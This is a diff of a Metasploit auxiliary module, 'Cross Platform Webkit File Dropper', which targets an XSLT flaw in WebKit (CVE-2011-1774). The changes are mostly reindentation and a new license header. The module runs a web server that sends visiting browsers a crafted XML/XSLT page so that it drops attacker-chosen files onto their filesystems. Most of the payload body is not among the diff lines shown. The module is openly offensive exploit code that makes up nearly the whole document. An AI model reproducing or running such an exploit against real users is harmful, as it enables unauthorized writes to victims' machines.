@@ -1,48 +1,46 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::HttpServer::HTML
-	include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::HttpServer::HTML
+  include Msf::Auxiliary::Report
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'        => 'Cross Platform Webkit File Dropper',
-			'Description' => %q{
-					This module exploits a XSLT vulnerability in Webkit to drop ASCII or UTF-8
-				files to the target file-system.  By default, the file will be dropped in
-				C:\Program Files\
-			},
-			'Author'      => [ 'Nicolas Gregoire' ],
-			'License'     => MSF_LICENSE,
-			'Actions'     =>
-				[
-					[ 'WebServer' ]
-				],
-			'PassiveActions' =>
-				[
-					'WebServer'
-				],
-			'DefaultAction'  => 'WebServer'))
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'Cross Platform Webkit File Dropper',
+      'Description' => %q{
+          This module exploits a XSLT vulnerability in Webkit to drop ASCII or UTF-8
+        files to the target file-system.  By default, the file will be dropped in
+        C:\Program Files\
+      },
+      'Author'      => [ 'Nicolas Gregoire' ],
+      'License'     => MSF_LICENSE,
+      'Actions'     =>
+        [
+          [ 'WebServer' ]
+        ],
+      'PassiveActions' =>
+        [
+          'WebServer'
+        ],
+      'DefaultAction'  => 'WebServer'))
 
-		register_options(
-			[
-				OptString.new('REMOTE_PATH', [ true, "Location of the remote file", 'flag.txt' ]),
-				OptString.new('REMOTE_CONTENT', [ true, "Content of the remote file", 'Hello from CVE-2011-1774' ])
-			], self.class)
-	end
+    register_options(
+      [
+        OptString.new('REMOTE_PATH', [ true, "Location of the remote file", 'flag.txt' ]),
+        OptString.new('REMOTE_CONTENT', [ true, "Content of the remote file", 'Hello from CVE-2011-1774' ])
+      ], self.class)
+  end
 
-	def on_request_uri(cli, request)
-		path  = datastore['REMOTE_PATH']
-		content  = datastore['REMOTE_CONTENT']
-		html = <<-EOS
+  def on_request_uri(cli, request)
+    path  = datastore['REMOTE_PATH']
+    content  = datastore['REMOTE_CONTENT']
+    html = <<-EOS
 <?xml-stylesheet type="text/xml" href="#fragment"?>
 <!-- Define the DTD of the document
      This is needed, in order to later reference the XSLT stylesheet by a #fragment
@@ -80,13 +78,13 @@ class Metasploit3 < Msf::Auxiliary
 </doc>
 EOS
 
-		print_status("Sending XSLT payload ...")
-		print_status("Destination file : #{path}")
-		send_response_html(cli, html, { 'Content-Type' => 'application/xml' })
-	end
+    print_status("Sending XSLT payload ...")
+    print_status("Destination file : #{path}")
+    send_response_html(cli, html, { 'Content-Type' => 'application/xml' })
+  end
 
-	def run
-		exploit()
-	end
+  def run
+    exploit()
+  end
 
 end
